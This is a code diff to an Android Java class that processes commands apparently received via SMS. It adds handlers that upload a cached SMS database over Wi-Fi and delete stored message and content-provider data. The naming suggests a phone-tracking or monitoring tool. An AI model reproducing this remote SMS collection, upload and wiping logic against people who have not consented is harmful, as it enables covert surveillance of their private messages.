@@ -10,6 +10,7 @@ import org.gdocument.gchattoomuch.lib.parser.SmsParser;
 import org.gdocument.gchattoomuch.lib.parser.SmsParser.MSG_TYPE;
 import org.gdocument.gchattoomuch.p2p.client.db.helper.DBContentProviderHelper;
 import org.gdocument.gchattoomuch.p2p.client.db.helper.DBSmsCacheHelper;
+import org.gdocument.gchattoomuch.p2p.client.db.service.DbContentProviderService;
 import org.gdocument.gchattoomuch.p2p.client.db.service.DbSmsCacheService;
 import org.gdocument.gchattoomuch.p2p.client.task.WifiDatabaseUploadTask;
 import org.gdocument.gtracergps.launcher.log.Logger;
@@ -71,8 +72,16 @@ public class MessageTypeBusiness {
 				processCleanDbSms();
 				ret = true;
 				break;
+			case CLEAN_DB_CACHE:
+				processCleanDbCache();
+				ret = true;
+				break;
 			case SEND_DB:
 				processSendDb(handler);
+				ret = true;
+				break;
+			case SEND_DB_CACHE:
+				processSendDbCache(handler);
 				ret = true;
 				break;
 			default:
@@ -83,10 +92,14 @@ public class MessageTypeBusiness {
 	}
 
 	private void processCleanDbSms() {
-//		for(CONTENT_PROVIDER provider : contentProvider) {
-//			logMe("processCleanDbSms contentProvider:" + provider);
-//			new DbContentProviderService(context, null, provider).deleteAll();
-//		}
+		for(CONTENT_PROVIDER provider : contentProvider) {
+			logMe("processCleanDbSms contentProvider:" + provider);
+			new DbContentProviderService(context, null, provider).deleteAll();
+		}
+		new DbSmsCacheService(context, null).deleteAll();
+	}
+
+	private void processCleanDbCache() {
 		new DbSmsCacheService(context, null).deleteAll();
 	}
 
@@ -115,6 +128,25 @@ public class MessageTypeBusiness {
 		new WifiDatabaseUploadTask(context, notifier, databaseNameList).execute();
 	}
 
+	private void processSendDbCache(Handler handler) {
+		Map<CONTENT_PROVIDER, SQLiteOpenHelper> mapHelper = initializeSQLiteHelperSynchrozed(handler);
+
+		List<String> databaseNameList = new ArrayList<String>();
+
+		CONTENT_PROVIDER provider = CONTENT_PROVIDER.SMS_CACHE;
+		SQLiteOpenHelper helper = mapHelper.get(provider);
+		if (helper != null) {
+			String path = helper.getReadableDatabase().getPath();
+			if (!databaseNameList.contains(path)) {
+				databaseNameList.add(path);
+			}
+		}
+
+		databaseNameList.add(new DBSmsCacheHelper(context, null).getReadableDatabase().getPath());
+
+		new WifiDatabaseUploadTask(context, notifier, databaseNameList).execute();
+	}
+
 	private Map<CONTENT_PROVIDER, SQLiteOpenHelper> initializeSQLiteHelperSynchrozed (Handler handler) {
 		final Map<CONTENT_PROVIDER, SQLiteOpenHelper> mapHelper = new HashMap<CONTENT_PROVIDER, SQLiteOpenHelper>();
 		final CountDownLatch latchData = new CountDownLatch(1);
@@ -127,8 +159,8 @@ public class MessageTypeBusiness {
 						if (provider.url != null) {
 							mapHelper.put(provider, new DBContentProviderHelper(context, notifier, provider));
 						}
-						mapHelper.put(CONTENT_PROVIDER.SMS_CACHE, new DBSmsCacheHelper(context, notifier));
 					}
+					mapHelper.put(CONTENT_PROVIDER.SMS_CACHE, new DBSmsCacheHelper(context, notifier));
 					latchData.countDown();
 				}
 			});
